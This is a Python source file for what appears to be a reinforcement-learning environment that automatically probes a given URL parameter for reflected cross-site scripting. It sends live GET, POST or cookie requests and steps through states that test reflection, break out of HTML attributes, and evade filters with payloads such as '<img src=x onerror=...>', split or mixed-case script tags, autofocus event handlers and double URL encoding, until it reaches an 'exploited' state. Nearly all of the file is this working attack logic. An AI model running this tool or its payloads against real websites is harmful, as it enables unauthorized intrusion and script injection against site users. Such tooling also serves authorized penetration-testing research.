import functools
from bs4 import BeautifulSoup
import sys, random, string, requests, re
import utils, xssExploit

# To add a new action: 
#  create a new method
#  add it to the self.actions dictionary in the states where it is allowed

# To add a new state:
#  add it to the self.states_name_to_location and self.states_location_to_name structures
#  add it to the self.action structure with its allowed actions
#  add the implementation in the resetPayload function
#  add the implementation in the goalCheck function
#  add the implementation in the goBack function 

class Enviroment:

    # Constructor that initiates the environment
    def __init__(self, url, method, parameter):

        # Check user input
        self.url, self.method, self.parameter = url, method, parameter
        
        # Initiliaze xssPayload
        self.xssExploit = xssExploit.XssExploit()
        
        # Injection point in response
        self.injection_point = ""

        # States
        self.states_name_to_location = {
            "testReflection":0,
            "addPadding":1,
            "findValidHtml":2,
            "avoidHtmlFilters":3,
            "avoidJsFilters":4,
            "exploited":5
        }
        self.states_location_to_name= {
            0:"testReflection",
            1:"addPadding",
            2:"findValidHtml",
            3:"avoidHtmlFilters",
            4:"avoidJsFilters",
            5:"exploited"
        }

        # Actions
        self.actions = {
            self.states_name_to_location["testReflection"]: {
                0: self.actionNewTestString,
            },
            self.states_name_to_location["addPadding"]: {
                0: self.actionAddSxRandomChar,
                1: self.actionAddDxRandomChar
            },
            self.states_name_to_location["findValidHtml"]:{
                0: self.actionInjectionInText,
                1: self.actionInjectionInAttribute,
                2: self.actionInjectionInAttributeSingleQuote,
                3: self.actionInjectionInAttributeDoubleQuotes
            },
            self.states_name_to_location["avoidHtmlFilters"]:{
                0: self.actionNewHtmlPayload,
                1: self.actionDubleEncode
            },
            self.states_name_to_location["avoidJsFilters"]:{
                0: self.actionNewJsPayload
            },
            self.states_name_to_location["exploited"]:{
                0: self.actionNewTestString
            }
        }

    # Return number of actions by state
    def getNumOfActions(self,state):
        if state >= 0 and state < len(self.states_name_to_location):
            return len(self.actions[state])
        else: 
            return 0

    # CONNECTION TO ENDPOINT

    # Request to endpoint 
    def checkConnection(self):
        #Connection
        response = self.connection(" ")

        # Handling exception
        if type(response) != requests.models.Response:
            print("{} error: {}".format(response["type"],response["msg"]))
            sys.exit(1)
        
        # No exception, so check status code
        else:
            if response.status_code in [200]:
                self.default_response_code=response.status_code
                print(self.connectionDetail())
            else:
                print("[!] Connection failed, http status code: {}".format(response.status_code))
                sys.exit(1)
    
    # Request to endpoint
    def connection(self, value):
        try:  
            if self.method == "GET":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    params={self.parameter: value}
                )
            elif self.method == "POST":
                response = requests.post(
                    self.url,
                    timeout=5.0,
                    data={self.parameter: value}  
                )
            elif self.method == "COOKIE":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    cookies={self.parameter: value}
                )
        except (requests.exceptions.Timeout):
            return {"type":"Connection","msg":"[!] Connection failed"}
        except requests.exceptions.HTTPError as err:
            return {"type":"Http","msg":err}
        except requests.exceptions.RequestException as err:
            return {"type":"Request","msg":err}

        # No exception, so return response
        return response

    # Only connect if the html is syntactically valid
    def connectionIfHtmlValid(self, response):
        print("Local test: {}".format(response))
        #TODO improve syntactically check
        if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
            return self.connection(self.xssExploit.payload())
        else:
            return ""

    # Print connection details 
    def connectionDetail(self,):
        return "\nUrl: {}\nMethod: {}\nParameter: {}\nResponse code: {}\n".format(self.url, self.method, self.parameter, self.default_response_code)

    # XSS EXPLOITATION

    # Returns the tag into where the random string was injected
    def getInjectionPoint(self, response):
        #print("[DEBUG] {} -> {}".format(self.xssExploit.expected(), response))
        soup = BeautifulSoup(response,features="lxml")
        for elem in soup(text=re.compile(self.xssExploit.expected())):
            injection_point = str(elem.parent).lower().replace(self.xssExploit.expected().lower(), "{}")
            if self.injection_point != "":
                self.injection_point = injection_point
                break
        if self.injection_point == "":
            self.injection_point = response.lower().replace(self.xssExploit.expected().lower(), "{}")

    # Execute action and return reward
    def doAction(self, state, action):
        print("\n[DEGUG]\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
        
        self.actions[state][action]()

        # Check if state is locally tested
        response = ""
        if state == self.states_name_to_location["findValidHtml"]:
            response = self.connectionIfHtmlValid(self.injection_point.lower().replace("{}",self.xssExploit.getHtml()))
        else:
            response = self.connection(self.xssExploit.payload())
        
        return self.goalCheck(state,response)

    # Checks if an XSS has been triggered
    def goalCheck(self, state, response):

        expected = self.xssExploit.expected()

        # Handling exception
        if response:
            response = response.text
            print("Expected: {}\nResponce: {}".format(expected.lower(), response.lower()))
            if type(response) != requests.models.Response:
                if type(response) == str:
                    if response == "":
                        print("[!] error: null response")
                        sys.exit(1)
                else:
                    print("[!] {} error: {}".format(response["type"],response["msg"]))
                    sys.exit(1)
        else: 
            print("Local test: not valid HTML")
        
        # Condictions
        isExpectedResponse = expected.lower() in response.lower()

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                self.getInjectionPoint(response)
                return self.states_name_to_location["findValidHtml"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], -1, False

        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            if isExpectedResponse and self.xssExploit.payload().lower() not in response.lower():
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                self.getInjectionPoint(response)
                return self.states_name_to_location["findValidHtml"], 100, False
            elif self.xssExploit.payload().lower() not in response.lower():
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], 10, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], -1, False

        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            if response != "":
                if isExpectedResponse:
                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                    return self.states_name_to_location["avoidJsFilters"], 100, False
                else:
                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                    return self.states_name_to_location["avoidHtmlFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["findValidHtml"], -1, False

        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidJsFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidHtmlFilters"], -1, False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["exploited"], 100, True
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidJsFilters"], -1, False

    # RESET AND GO BACK FUNCTIONS 

    # Roll back all actions done in this state
    def resetPayload(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            self.xssExploit.setHtmlBody("","")
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            self.xssExploit.setPaddings("","")
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            self.xssExploit.setHtmlSyntaxPaddings("","","","")
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            self.xssExploit.setHtmlBody("","")

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            self.xssExploit.setJsBody("","")

    # Go to the previous state, return the new state and a boolean indicating whether one has returned to the starting point
    def goBack(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            return self.states_name_to_location["testReflection"], True
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            return self.states_name_to_location["testReflection"], False
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            return self.states_name_to_location["testReflection"], False
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            return self.states_name_to_location["findValidHtml"], False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            return self.states_name_to_location["avoidHtmlFilters"], False

    # ACTIONS TEST REFLECTION

    def actionNewTestString(self):
        random_string = "".join((random.choice(string.ascii_letters) for i in range(10)))
        self.xssExploit.setHtmlBody(random_string, random_string)
    
    # ACTIONS ADD PADDING

    def actionAddSxRandomChar(self):
        self.xssExploit.setPaddings("".join(random.choices(string.ascii_letters, k=1)),"")

    def actionAddDxRandomChar(self):
        self.xssExploit.setPaddings("","".join(random.choices(string.ascii_letters, k=1)))

    # ACTIONS FIND VALID HTML

    def actionInjectionInText(self):
        # Set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)

    def actionInjectionInAttribute(self):
        # Find open tag
        tag = re.findall("<(\w*)",self.injection_point)
        if len(tag) > 0:
            print("TAG: {}".format(tag[0]))
            tag = tag[0]
        else:
            tag = "p"
        
        # Set html padding
        padding_sx = "1>"
        padding_dx = "<\\{}><{} ".format(tag,tag)
        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
        
        # Set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)

    def actionInjectionInAttributeSingleQuote(self):
        # Find open tag
        tag = re.findall("<(\w*)",self.injection_point)
        if len(tag) > 0:
            tag = tag[0]
        else:
            tag = "p"
        
        # Set html padding
        padding_sx = "1'>"
        padding_dx = "<{} ".format(tag)
        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
        
        # Set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)

    def actionInjectionInAttributeDoubleQuotes(self):
        # Find open tag
        tag = re.findall("<(\w*)",self.injection_point)
        if len(tag) > 0:
            print("TAG: {}".format(tag[0]))
            tag = tag[0]
        else:
            tag = "p"
        
        # Set html padding
        padding_sx = "1\">"
        padding_dx = "<\\{}><{} ".format(tag,tag)
        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
        
        # Set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)


    # ACTIONS AVOID HTML FILTERS

    def actionNewHtmlPayload(self):
        htmlPayloads = ["<sc<script>ript>{}</scri</script>pt>","<sCript>{}</sCRIpt>","<input onblur={} autofocus><input autofocus>"]
        htmlPayload = "".join(random.choices(htmlPayloads, k=1))
        self.html = htmlPayload
        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
    
    def actionDubleEncode(self):
        # Encoding dictionaries
        singleEncoding = {"<":"3C", ">":"3E", "/":"2F", "\\":"5C", "\"":"22", "'":"27"}
        doubleEncoding = {"<":"253C", ">":"253E", "/":"252F", "\\":"255C", "\"":"2522", "'":"2527"}

        # Replace each character in the encoding dictionaries with the replaceValues function of XssExploit
        for key in singleEncoding:
            for fields in ("html_body","html_syntax_padding_sx", "html_syntax_padding_dx"):
                self.xssExploit.replaceValues(True, fields, key, "%"+doubleEncoding[key])
                self.xssExploit.replaceValues(False, fields, key, "%"+singleEncoding[key])

    # ACTIONS AVOID JS FILTERS

    def actionNewJsPayload(self):
        jsPayloads = ["alert(1)","print()","alert(String.fromCharCode(49)","prompt(8)"]
        jsPayload = "".join(random.choices(jsPayloads, k=1))
        self.xssExploit.setJsBody(jsPayload, jsPayload)